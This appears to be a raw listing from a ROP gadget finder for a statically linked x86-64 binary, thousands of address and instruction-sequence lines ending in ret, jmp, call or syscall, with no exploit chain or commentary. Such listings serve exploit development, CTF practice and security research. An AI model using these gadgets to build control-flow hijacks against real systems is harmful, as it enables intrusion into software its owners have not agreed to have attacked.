0x000000000044a085 : dec dword ptr [rax - 0x39] ; ret 0xffc0
0x0000000000449c5c : dec dword ptr [rax - 0x39] ; ret 0xffff
0x000000000048be9f : dec dword ptr [rax - 0x46] ; mov eax, 0xf ; syscall
0x00000000004570a4 : dec dword ptr [rax - 0x73] ; add cl, byte ptr [rax + 0x39] ; ret
0x000000000047fc65 : dec dword ptr [rax - 0x73] ; push rbp ; add dword ptr [rax + 0x39], ecx ; ret 0x1272
0x000000000041f438 : dec dword ptr [rax - 0x73] ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x000000000048c392 : dec dword ptr [rax - 0x75] ; add byte ptr [rcx + 1], cl ; ret 0xef89
0x000000000044f9ac : dec dword ptr [rax - 0x75] ; jne 0x44f946 ; call rsi
0x00000000004692bb : dec dword ptr [rax - 0x75] ; mov ebp, 0xfffff730 ; call rax
0x000000000048cbbf : dec dword ptr [rax - 0x75] ; push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x000000000044b435 : dec dword ptr [rax - 0x75] ; push rdi ; adc byte ptr [rax - 0x7d], cl ; retf 0x4901
0x0000000000481dec : dec dword ptr [rax - 0x77] ; adc byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00000000004200e4 : dec dword ptr [rax - 0x77] ; add eax, 0x299774 ; ret
0x000000000048a547 : dec dword ptr [rax - 0x77] ; add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x000000000047f5e1 : dec dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00000000004900f4 : dec dword ptr [rax - 0x77] ; fucomip st(0) ; ret
0x0000000000401b6d : dec dword ptr [rax - 0x77] ; ret
0x0000000000475a2e : dec dword ptr [rax - 0x77] ; ret 0x1477
0x000000000047ce17 : dec dword ptr [rax - 0x77] ; ret 0x18e8
0x000000000041f8df : dec dword ptr [rax - 0x77] ; ret 0x2948
0x0000000000424c8b : dec dword ptr [rax - 0x77] ; ret 0x5ae9
0x000000000047598d : dec dword ptr [rax - 0x77] ; ret 0x7577
0x000000000041f65c : dec dword ptr [rax - 0x77] ; ret 0x8548
0x0000000000423fe7 : dec dword ptr [rax - 0x77] ; ret 0x854d
0x000000000045b6f2 : dec dword ptr [rax - 0x77] ; ret 0x870f
0x000000000046db50 : dec dword ptr [rax - 0x77] ; ret 0x8b44
0x0000000000449b43 : dec dword ptr [rax - 0x77] ; ret 0x8b48
0x00000000004787fc : dec dword ptr [rax - 0x77] ; ret 0x8d4c
0x0000000000424706 : dec dword ptr [rax - 0x77] ; ret 0x90e9
0x000000000044aeb5 : dec dword ptr [rax - 0x77] ; ret 0xa076
0x0000000000449ce1 : dec dword ptr [rax - 0x77] ; ret 0xa0e9
0x00000000004570bd : dec dword ptr [rax - 0x77] ; ret 0xb2eb
0x0000000000449ccd : dec dword ptr [rax - 0x77] ; ret 0xb4e9
0x0000000000424b18 : dec dword ptr [rax - 0x77] ; ret 0xb60f
0x000000000046bbc9 : dec dword ptr [rax - 0x77] ; ret 0xb848
0x000000000046de46 : dec dword ptr [rax - 0x77] ; ret 0xd9e8
0x0000000000475f6c : dec dword ptr [rax - 0x77] ; ret 0xefeb
0x000000000046fe8a : dec dword ptr [rax - 0x77] ; ret 0xf41
0x000000000040590f : dec dword ptr [rax - 0x77] ; ret 0xf748
0x0000000000411b5e : dec dword ptr [rax - 0x77] ; retf
0x0000000000477f9c : dec dword ptr [rax - 0x77] ; retf 0x2de9
0x0000000000462014 : dec dword ptr [rax - 0x77] ; retf 0x8948
0x00000000004114d9 : dec dword ptr [rax - 0x77] ; retf 0x894c
0x0000000000477efd : dec dword ptr [rax - 0x77] ; retf 0xb60f
0x000000000046d00f : dec dword ptr [rax - 0x77] ; retf 0xc148
0x0000000000469ab3 : dec dword ptr [rax - 0x7d] ; clc ; dec dword ptr [rax - 0x77] ; ret
0x0000000000481baa : dec dword ptr [rax - 0x7d] ; clc ; std ; jbe 0x481bc0 ; ret
0x000000000040485f : dec dword ptr [rax - 0x7d] ; ret
0x0000000000454ec1 : dec dword ptr [rax - 0x7d] ; ret 0x4801
0x00000000004535ab : dec dword ptr [rax - 0x7d] ; ret 0x4804
0x0000000000405e5b : dec dword ptr [rax - 0x7d] ; ret 0x4901
0x0000000000457194 : dec dword ptr [rax - 0x7d] ; ret 0x8801
0x000000000048e187 : dec dword ptr [rax - 0x7d] ; ret 0xe902
0x000000000040da8c : dec dword ptr [rax - 0x7d] ; retf 0xeb0b
0x0000000000459c98 : dec dword ptr [rax - 0x7d] ; rol byte ptr [rcx], 0x83 ; ret 0x4801
0x000000000044bf40 : dec dword ptr [rax - 0x7f] ; ret
0x000000000043510c : dec dword ptr [rax - 0x7f] ; ret 0x80
0x000000000047716d : dec dword ptr [rax - 9] ; fmul dword ptr [rcx + 0x21] ; ret
0x000000000048eb84 : dec dword ptr [rax - 9] ; ret
0x0000000000458e15 : dec dword ptr [rax - 9] ; ror dword ptr [rax - 0x77], 1 ; retf 0x8348
0x0000000000492857 : dec dword ptr [rax] ; stc ; idiv bh ; jmp 0xffffffffe1491f61
0x0000000000461cf4 : dec dword ptr [rbp + 0x63] ; ret 0x20be
0x000000000045ac48 : dec dword ptr [rbp + rcx*4 + 0x1d] ; movsb byte ptr [rdi], byte ptr [rsi] ; retf 3
0x0000000000477a82 : dec dword ptr [rbp + rcx*4 + 0xd] ; retf
0x0000000000467f3d : dec dword ptr [rbp - 0x77] ; ret 0x894c
0x0000000000451d1d : dec dword ptr [rbp - 0x77] ; retf
0x000000000045cd36 : dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x0000000000424943 : dec dword ptr [rbp - 0x7b] ; test byte ptr [rdi], 0x84 ; ret
0x0000000000400ee4 : dec dword ptr [rbx + 0x2baf1115] ; add bh, dh ; ret 0
0x00000000004ab3c7 : dec dword ptr [rbx + 0x38fffdfc] ; cld ; std ; call rax
0x000000000042365d : dec dword ptr [rbx + 0x90c2454] ; ret 0xbae9
0x0000000000471c78 : dec dword ptr [rbx - 0x14f3db8c] ; ret 0x5590
0x000000000047120b : dec dword ptr [rbx - 0x3b7cb7fa] ; or byte ptr [rbx + 0x5d], bl ; ret
0x000000000048c7b8 : dec dword ptr [rcx + 0x21] ; retf 0x8948
0x000000000048c7d6 : dec dword ptr [rcx + 0x29] ; retf 0x8948
0x000000000048c837 : dec dword ptr [rcx + 0x31] ; retf 0x8948
0x0000000000460533 : dec dword ptr [rcx + 0x39] ; ret
0x0000000000461c4f : dec dword ptr [rcx + 0x39] ; ret 0x850f
0x000000000047c4b9 : dec dword ptr [rcx + 0x39] ; ret 0x860f
0x000000000048ae2a : dec dword ptr [rcx + 0x39] ; retf
0x000000000048c842 : dec dword ptr [rcx + 0x39] ; retf 0x8948
0x000000000046b3d5 : dec dword ptr [rcx + 0x63] ; ret
0x000000000046af57 : dec dword ptr [rcx + 0x63] ; ret 0x8545
0x000000000046d6fe : dec dword ptr [rcx + 0x63] ; retf 0x20be
0x000000000040229d : dec dword ptr [rcx + 0x63] ; test dword ptr [rax], r8d ; add rax, r13 ; jmp rax
0x000000000048c80b : dec dword ptr [rcx + 1] ; retf 0x8948
0x000000000048c800 : dec dword ptr [rcx + 9] ; retf 0x8948
0x000000000047c735 : dec dword ptr [rcx + rax - 0x28] ; call rax
0x0000000000458a9a : dec dword ptr [rcx + rcx*4 - 0x11] ; call r12
0x000000000044f9a9 : dec dword ptr [rcx + rcx*4 - 1] ; mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x0000000000458bf1 : dec dword ptr [rcx + rcx*4 - 9] ; call rbx
0x0000000000458ecf : dec dword ptr [rcx + rcx*4 - 9] ; call rdx
0x000000000045dbe6 : dec dword ptr [rcx - 0x2f42763f] ; idiv bh ; call rax
0x000000000046cf33 : dec dword ptr [rcx - 0x4e773] ; inc dword ptr [rcx + 0x29] ; retf 0x98e9
0x000000000041c77c : dec dword ptr [rcx - 0x73] ; and byte ptr [r8 - 0x7d], r9b ; retf
0x0000000000492286 : dec dword ptr [rcx - 0x73] ; and byte ptr [rax - 0x7d], cl ; retf
0x00000000004895b7 : dec dword ptr [rcx - 0x73] ; or byte ptr [rax - 0x77], r9b ; ret
0x000000000040e36f : dec dword ptr [rcx - 0x75] ; add byte ptr [r8 - 0x7d], r9b ; ret
0x0000000000460497 : dec dword ptr [rcx - 0x77] ; ret
0x000000000047c800 : dec dword ptr [rcx - 0x77] ; ret 0x13e9
0x00000000004048a1 : dec dword ptr [rcx - 0x77] ; ret 0x149
0x000000000047d1a0 : dec dword ptr [rcx - 0x77] ; ret 0x9be9
0x000000000046af24 : dec dword ptr [rcx - 0x77] ; ret 0xff31
0x000000000041cb16 : dec dword ptr [rcx - 0x7b] ; ret
0x000000000046029f : dec dword ptr [rcx - 0x7d] ; ret
0x000000000046079b : dec dword ptr [rdi + rcx + 0x48] ; ret 0x958b
0x000000000045144b : dec dword ptr [rdi] ; ret 0x41c3
0x0000000000453aaf : dec dword ptr [rdi] ; test byte ptr [rsi - 0x8fffffc], cl ; ret 0
0x0000000000446ce0 : dec dword ptr [rdi] ; test dword ptr [rsi + 1], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000045fa7f : dec dword ptr [rdi] ; test dword ptr [rsi - 0x16000007], esi ; ret
0x000000000047d8fa : dec dword ptr [rdi] ; xchg bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000460207 : dec dword ptr [rdi] ; xchg byte ptr [rdx], ah ; and byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0x8948
0x0000000000421bec : dec dword ptr [rdi] ; xchg eax, ebp ; ret 0xd020
0x00000000004190eb : dec dword ptr [rdi] ; xchg eax, ebp ; sal bh, 0xd8 ; ret
0x0000000000494cff : dec dword ptr [rsi + 0x39] ; cli ; call rax
0x000000000049686b : dec dword ptr [rsi + rsi*2] ; sti ; jmp qword ptr [rax]
0x00000000004954ef : dec dword ptr [rsi] ; sti ; jmp qword ptr [rbx]
0x0000000000400c43 : dec ecx ; ret
0x0000000000496867 : dec edi ; jne 0x49686e ; dec dword ptr [rsi + rsi*2] ; sti ; jmp qword ptr [rax]
0x000000000045bde8 : dec qword ptr [r13 - 0x77] ; retf
0x0000000000442c91 : dec qword ptr [r8 + 0x29] ; ret 0x280f
0x0000000000480e98 : div bh ; dec dword ptr [rax - 0x77] ; ret
0x00000000004737f2 : div byte ptr [rbp + 4] ; xor rax, rax ; ret
0x000000000047e865 : div byte ptr [rbx + rax + 0x48] ; mov dword ptr [rsi], edi ; mov rax, rcx ; ret
0x0000000000459011 : div byte ptr [rsp + rcx - 0x7d] ; inc byte ptr [rbx] ; je 0x459029 ; ret
0x0000000000451ae2 : div dword ptr [rdi + rbp - 0x75] ; adc dword ptr [rdi], ecx ; retf 0xd285
0x0000000000465f86 : div eax ; add r9d, eax ; mov eax, r9d ; ret
0x000000000046ff46 : div ebp ; mov rbp, rax ; jmp 0x46ff15
0x0000000000448b18 : div ecx ; mov eax, eax ; ret
0x0000000000448aff : div ecx ; pop rbx ; mov eax, eax ; ret
0x000000000046ff45 : div r13 ; mov rbp, rax ; jmp 0x46ff16
0x0000000000465f85 : div r8d ; add r9d, eax ; mov eax, r9d ; ret
0x000000000042c1d7 : enter -0x23b, -0x29 ; ret 0xc085
0x000000000047e7c0 : enter -0x3eb8, -8 ; add cl, byte ptr [rax - 0x77] ; ret 0xc148
0x000000000045a8cd : enter -0x3fcf, -0x18 ; retf
0x0000000000446e54 : enter -0x3fe7, -0x7d ; fdivr st(7) ; ret
0x00000000004838fb : enter -0x72b8, 0x41 ; adc byte ptr [rdi], cl ; sahf ; ret 0x3948
0x0000000000442b4e : enter -0x72b8, 0x49 ; dec byte ptr [rax + 0x29] ; ret 0x280f
0x0000000000442c8e : enter -0x72b8, 0x49 ; dec dword ptr [rax + 0x29] ; ret 0x280f
0x00000000004761f0 : enter -0x72b8, 0xc ; xor byte ptr [rax + 1], cl ; retf
0x000000000042bfb7 : enter -0x73b, 0x77 ; ret
0x00000000004057c7 : enter -0x76b3, -0x19 ; jmp 0x40579c
0x000000000047e8ca : enter -0x76b8, -0x38 ; ret
0x00000000004647cf : enter -0x7cb7, -0x40 ; add dword ptr [rcx], edi ; retf
0x0000000000423f56 : enter -2, -0x18 ; ret 0xfe9d
0x000000000042c984 : enter -2, -1 ; ret
0x000000000047e532 : enter -4, 0x48 ; mov ebp, eax ; jmp 0x47e50b
0x000000000049e41c : enter 0, 0 ; retf
0x00000000004a2470 : enter 0, 0 ; retf 0
0x000000000049f5c8 : enter 0x10, 0 ; retf
0x000000000046f4dc : enter 0x117f, 1 ; clc ; mov rdx, r8 ; jmp 0x46f4b6
0x00000000004410d9 : enter 0x148, -8 ; vzeroupper ; ret
0x000000000046be0c : enter 0x1b9, 0 ; add byte ptr [rax], al ; jmp rax
0x00000000004ade24 : enter 0x24, 0 ; call 0x174ad4ec
0x00000000004846c1 : enter 0x289, -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000044143e : enter 0x2948, -0x30 ; vzeroupper ; ret
0x000000000042653d : enter 0x31c3, -0x40 ; ret
0x0000000000447440 : enter 0x357e, 0x48 ; movsxd rax, ecx ; ret
0x00000000004a977c : enter 0x8ac, 0x47 ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x000000000049edc8 : enter 0xa, 0 ; retf
0x000000000049f1c8 : enter 0xd, 0 ; retf
0x000000000042dc26 : enter 0xf66, -0x11 ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000440aa1 : enter 0xf66, -0x15 ; ret
0x00000000004a2670 : enter 1, 0 ; retf 1
0x000000000049f980 : enter 2, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; retf
0x00000000004a2870 : enter 2, 0 ; retf 2
0x00000000004a2a70 : enter 3, 0 ; retf 3
0x00000000004a2c70 : enter 4, 0 ; retf 4
0x00000000004a2e70 : enter 5, 0 ; retf 5
0x00000000004a3070 : enter 6, 0 ; retf 6
0x00000000004a3270 : enter 7, 0 ; retf 7
0x00000000004a3470 : enter 8, 0 ; retf 8
0x00000000004a3670 : enter 9, 0 ; retf 9
0x000000000048d2a3 : fadd dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rbx + rbx*8 - 0xd], dh ; ret
0x0000000000410598 : fadd dword ptr [rax] ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x0000000000410066 : fadd dword ptr [rax] ; add byte ptr [rax], al ; ret
0x0000000000466298 : fadd dword ptr [rbx] ; add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0xace8
0x00000000004589c5 : fadd qword ptr [rax - 0x7bf0ffc2] ; retf
0x0000000000465f73 : fadd qword ptr [rcx + rcx*4 - 0x38] ; ret
0x000000000042d771 : fbld tbyte ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000468aee : fbstp tbyte ptr [rbp + rax - 0x18] ; retf 0xfb7e
0x00000000004900b4 : fbstp tbyte ptr [rbp - 0x17] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004a8db8 : fcmovb st(0), st(3) ; ret
0x000000000044155b : fcmovnb st(0), st(5) ; std ; xlatb ; ret
0x000000000045ec66 : fcmovnb st(0), st(6) ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x00000000004948b8 : fcom qword ptr [rbx] ; cli ; ljmp [rbx + rdx - 6] ; call qword ptr [rdx]
0x000000000048d2a9 : fcomi st(3) ; ret
0x0000000000410d89 : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; ret
0x0000000000414fc6 : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000044ad51 : fcomp dword ptr [rbx + 0x5d] ; ret
0x00000000004a9b39 : fcomp dword ptr [rdx + 0x21] ; ret
0x00000000004b1738 : fcomp qword ptr [rbp] ; add byte ptr [rcx + rdi*2 - 6], dl ; jmp rax
0x00000000004a7da0 : fcomp qword ptr [rdi - 0x4a] ; ret 0x474c
0x00000000004ae405 : fdecstp ; call qword ptr [rax]
0x00000000004885a8 : fdiv dword ptr [rbp + 0x11] ; add rsp, 0x40 ; pop rbx ; ret
0x000000000048868f : fdiv dword ptr [rbp + 0x12] ; add rsp, 0x50 ; pop rbx ; ret
0x000000000048aef9 : fdiv st(3) ; ret
0x0000000000494721 : fdivp st(1) ; inc dword ptr [rax - 0x20] ; stc ; jmp qword ptr [rax]
0x0000000000494741 : fdivp st(1) ; inc dword ptr [rax] ; loopne 0x494746 ; call rax
0x0000000000494740 : fdivp st(1) ; inc dword ptr [rax] ; loopne 0x494747 ; call rax
0x00000000004b1e55 : fdivp st(2) ; call qword ptr [rsi]
0x00000000004947b5 : fdivr st(1) ; jmp qword ptr [rax]
0x00000000004a70f5 : fdivr st(4) ; test al, 0x97 ; xchg eax, esp ; ret
0x0000000000446e58 : fdivr st(7) ; ret
0x000000000040f8f8 : fiadd dword ptr [rbp + 0x450f48c9] ; ret 0x8348
0x00000000004713b3 : fiadd dword ptr [rbx - 0x7bf0fc1e] ; retf
0x0000000000412dea : fiadd word ptr [rcx + rcx*4 - 0x11] ; mov eax, r9d ; syscall
0x000000000047b272 : ficom word ptr [rdi + 0xf480002] ; ret 0x8b48
0x00000000004a9986 : ficomp word ptr [rdx - 0x19] ; cmc ; mov ch, 0xab ; ret
0x0000000000488205 : fidivr dword ptr [rax + 1] ; ret
0x0000000000424fa1 : fild word ptr [r9] ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000464d62 : fild word ptr [rbp - 0x77] ; ret 0x8b4c
0x0000000000424fa2 : fild word ptr [rcx] ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000041a58c : fimul dword ptr [rax + 0x21] ; ret 0x8948
0x0000000000455c59 : fimul dword ptr [rax + 0x29] ; ret 0x8348
0x0000000000480e87 : fimul dword ptr [rax + 0x39] ; ret 0x7472
0x00000000004658fd : fimul dword ptr [rax + 0x39] ; ret 0xe57f
0x00000000004868f4 : fimul dword ptr [rax + 0x39] ; retf 0xe677
0x00000000004658c2 : fimul dword ptr [rax + 0x39] ; retf 0xe87f
0x000000000042ad06 : fimul dword ptr [rax + rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000046c27d : fimul dword ptr [rax - 0x3f] ; clc ; add cl, byte ptr [rax + 0x29] ; ret 0xb8
0x0000000000404a84 : fimul dword ptr [rbx + 0x4d8b005d] ; add al, 0xf ; retf
0x00000000004515ef : fimul word ptr [rax + 1] ; ret
0x000000000048454c : fimul word ptr [rbp + 0x11] ; retf
0x000000000048450e : fimul word ptr [rbp + rcx*4 + 0xa] ; jmp 0x484568
0x000000000048830e : fimul word ptr [rbp + rcx*4 + 0xa] ; jmp 0x488368
0x0000000000422341 : fimul word ptr [rcx + rcx*4 - 0x11] ; call 0x41e586
0x000000000044a24f : fistp qword ptr [rax + 1] ; syscall
0x0000000000416fce : fistp word ptr [rbx + 0x5d] ; jmp rax
0x0000000000470ee0 : fistp word ptr [rbx + 0x5d] ; pop r12 ; jmp rax
0x0000000000485a2e : fisttp dword ptr [rax - 0x73] ; push rax ; or byte ptr [rax - 0x73], cl ; or al, 0xca ; jmp 0x485a4c
0x0000000000459227 : fisttp dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000483501 : fisttp dword ptr [rax - 0x77] ; ret
0x000000000046674c : fisttp dword ptr [rax - 0x7b] ; rol byte ptr [rcx + 0xf], 0x94 ; ret
0x000000000047f656 : fisttp dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x94 ; ret
0x00000000004780ce : fisttp dword ptr [rax - 0x7d] ; ret
0x000000000048c6d0 : fisttp dword ptr [rbx + 0x63] ; add al, 0x99 ; add rax, r9 ; jmp rax
0x000000000048351b : fisttp dword ptr [rcx - 0x77] ; ret 0x8b4a
0x0000000000455937 : fisttp dword ptr [rcx - 0x7d] ; ret
0x000000000047d774 : fisttp dword ptr [rdi] ; xchg eax, ebp ; ret
0x00000000004217db : fisttp dword ptr [rdi] ; xchg eax, ebp ; ret 0xd020
0x0000000000405e7e : fisttp qword ptr [rax - 0x7d] ; ret 0x4401
0x000000000045858a : fisttp qword ptr [rdi] ; ret 0xc389
0x0000000000480e92 : fisttp word ptr [rax - 0x77] ; ret 0xde8
0x00000000004019d3 : fisttp word ptr [rax - 0x7d] ; ret
0x000000000048359f : fisttp word ptr [rax] ; add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
0x000000000044a50d : fisttp word ptr [rcx + 0x3b8c2] ; add byte ptr [rax], al ; syscall
0x000000000043fb9d : fisttp word ptr [rip - 0x7cb80000] ; ret 0x4910
0x000000000042db41 : fisub dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042d841 : fisub word ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000483814 : fld qword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret 0x149
0x00000000004a7de1 : fld qword ptr [rsi + 0x32] ; mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret
0x0000000000473642 : fld st(5) ; std ; xlatb ; retf 0xfdc5
0x00000000004736a2 : fld st(5) ; std ; xlatb ; rol ch, cl ; std ; xlatb ; ret
0x000000000042bbe9 : fldenv [rsi + 0xf] ; je 0x42bc46 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000042bec7 : fldenv [rsi + 0xf] ; je 0x42bf24 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000042dbc1 : fldenv [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042bae1 : fldenv [rsi + 0xf] ; xlatb ; ret
0x0000000000455643 : fldl2t ; retf 0xfffd
0x000000000046876c : fldpi ; stosd dword ptr [rdi], eax ; mov eax, 1 ; ret
0x00000000004845b4 : fmul dword ptr [rax + 0x11] ; rcr byte ptr [rbp + 0x5b], 1 ; ret
0x000000000041b68f : fmul dword ptr [rax + 0x39] ; ret
0x0000000000447127 : fmul dword ptr [rax + 9] ; retf 0x4466
0x0000000000412a68 : fmul dword ptr [rax - 0x77] ; ret
0x000000000040e181 : fmul dword ptr [rax - 0x7d] ; ret 0x4801
0x0000000000489b04 : fmul dword ptr [rbx + rcx*4 + 0x34] ; ret 0xf41
0x000000000044cdfc : fmul dword ptr [rbx - 0x7ad33ebc] ; ror byte ptr [rdi], 0x84 ; retf 0
0x0000000000477170 : fmul dword ptr [rcx + 0x21] ; ret
0x0000000000469150 : fmul dword ptr [rdi] ; ret
0x0000000000486d92 : fmul qword ptr [rax - 0x77] ; ret
0x000000000048f13e : fmul qword ptr [rbx + rcx*4 + 0x58] ; sub byte ptr [rbp + 1], cl ; retf
0x00000000004252f9 : fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x000000000043981f : fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x000000000045f85f : fmul qword ptr [rdi] ; lea ebp, [rdx] ; add al, byte ptr [rax] ; add byte ptr [rax + 0x63], cl ; ret
0x0000000000458788 : fmul qword ptr [rdi] ; ret 0xc389
0x0000000000473640 : fnsave dword ptr [rcx + rbx*8 - 0x3b] ; std ; xlatb ; retf 0xfdc5
0x0000000000424e5f : fnsave dword ptr [rdi] ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x0000000000456ded : fnsave dword ptr [rdx + 0x68] ; mov rdx, rax ; jmp 0x456db4
0x0000000000484ea3 : fnstenv [rcx + 0x23] ; add cl, ch ; retf
0x00000000004a962a : fnstsw dword ptr [rbx + rdx*4] ; in al, dx ; retf 0xae32
0x000000000040dbd9 : fpatan ; ret
0x000000000042d941 : frstor dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004a7ac7 : fstp dword ptr [rbx + 0x4a315a58] ; ret 0x1b49
0x00000000004a7e40 : fstp st(0) ; ret 0xde5d
0x00000000004a700b : fstp st(3), st(0) ; retf 0xeb83
0x00000000004b5f34 : fsub dword ptr [rbp - 0x60580000] ; std ; jmp qword ptr [rax]
0x00000000004498f8 : fsub dword ptr [rcx + rcx*4 + 1] ; or rax, 0xffffffffffffffff ; ret
0x0000000000449f08 : fsub dword ptr [rcx + rcx*4 + 2] ; mov eax, 0xffffffff ; ret
0x000000000042dc41 : fsub dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004419c4 : fsub dword ptr [rsi + 0xf] ; xlatb ; ret
0x00000000004a93f8 : fsub qword ptr [rbx] ; sub dword ptr [rsi], 0x76 ; retf
0x000000000044726b : fsub qword ptr [rsi + 0xf] ; jmp 0x447237
0x000000000042da41 : fsub qword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000440bbc : fsub qword ptr [rsi + 0xf] ; xlatb ; ret
0x000000000044e176 : fsub qword ptr [rsi] ; add al, ch ; ret 0xfde1
0x0000000000433770 : fsubr qword ptr [rcx + 0x28] ; add byte ptr [rax + 0x39], cl ; retf 0x830f
0x000000000044a4b4 : fsubr st(3) ; ret 0xf66
0x00000000004a9b18 : fucom st(5) ; loop 0x4a9b71 ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x0000000000472867 : fucomi st(0) ; ret
0x000000000047a301 : fucomi st(3) ; ret 0x1f0f
0x0000000000402ea9 : fucomip st(0) ; push rcx ; rol byte ptr [rcx], cl ; add byte ptr [rax - 0x77], cl ; ret 0x7ce9
0x00000000004900f7 : fucomip st(0) ; ret
0x000000000048b5a1 : fucomip st(1) ; ret
0x00000000004a915e : fxch st(0), st(6) ; mov bl, 0xe ; or dh, al ; mov ebx, dword ptr [rdx] ; retf 0x7272
0x00000000004947f5 : fyl2xp1 ; call qword ptr [rax - 0x1f000626]
0x00000000004ab4dc : hlt ; adc dh, bh ; call rsp
0x00000000004b1e50 : hlt ; add byte ptr fs:[rax], al ; jl 0x4b1e3b ; cli ; call qword ptr [rsi]
0x000000000044b571 : hlt ; call r15
0x00000000004afb7c : hlt ; jg 0x4afb7b ; call rsp
0x00000000004a7ec8 : hlt ; jmp 0x4a7e9d
0x00000000004b0c1a : hlt ; jmp qword ptr [rbx]
0x00000000004b3e82 : hlt ; jmp qword ptr [rcx]
0x000000000043554a : hlt ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004301fe : hlt ; mov dword ptr [rdi - 4], edx ; ret
0x000000000044993e : hlt ; mov edi, edx ; mov eax, r8d ; syscall
0x0000000000446963 : hlt ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x0000000000400a5a : hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000494c99 : hlt ; stc ; jmp qword ptr [rax + 0x20fff9f5]
0x0000000000494cd9 : hlt ; stc ; jmp qword ptr [rax]
0x00000000004a8003 : hlt ; stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x0000000000446967 : hlt ; sub eax, edx ; ret
0x000000000045dbec : idiv bh ; call rax
0x000000000045ee34 : idiv bh ; inc dword ptr [rax] ; add byte ptr [rax], al ; add cl, ch ; ret 0xfffa
0x000000000049285a : idiv bh ; jmp 0xffffffffe1491f5e
0x000000000045e946 : idiv bh ; jmp qword ptr [rax]
0x0000000000492856 : idiv bh ; or cl, bh ; idiv bh ; jmp 0xffffffffe1491f62
0x00000000004ad4de : idiv bh ; retf
0x00000000004928f6 : idiv bh ; retf 0xf6fa
0x0000000000451446 : idiv byte ptr [rdx - 1] ; cmovs eax, edx ; ret
0x0000000000494d54 : idiv byte ptr [rip + 0x3d86fffa] ; cli ; call qword ptr [rsi]
0x0000000000494cdd : idiv cl ; jmp qword ptr [rax + 0x20fff9f7]
0x0000000000494ca1 : idiv ecx ; jmp qword ptr [rax + 0x20fff9f8]
0x0000000000494ce1 : idiv ecx ; jmp qword ptr [rax]
0x000000000045df06 : idiv edi ; call qword ptr [rax]
0x000000000045eeba : idiv edi ; dec dword ptr [rax + 0x63] ; retf
0x000000000045ddee : idiv edi ; dec dword ptr [rax - 0x39] ; ret 0xac20
0x000000000046a8f1 : idiv edi ; dec dword ptr [rax - 0x77] ; ret
0x0000000000469b4d : idiv edi ; inc dword ptr [rcx - 1] ; push rbp ; cmp byte ptr [rax + 0x39], cl ; ret
0x0000000000495369 : idiv edx ; call rax
0x0000000000495375 : idiv edx ; inc dword ptr [rax] ; clc ; cli ; call qword ptr [rax]
0x0000000000495365 : idiv edx ; inc eax ; idiv edx ; call rax
0x000000000049536d : idiv edx ; jmp rax
0x00000000004038a5 : imul eax ; insd dword ptr [rdi], dx ; retf
0x0000000000414248 : imul eax ; pop rdx ; ret 0xfffe
0x000000000045d4d7 : imul eax ; retf
0x00000000004b22e9 : imul eax, dword ptr [rax], 0xfb925400 ; jmp qword ptr [rax]
0x00000000004454c1 : imul eax, dword ptr [rcx], 0 ; add dh, dh ; ret 0x7502
0x0000000000429137 : imul eax, dword ptr [rcx], 0x894d0000 ; retf
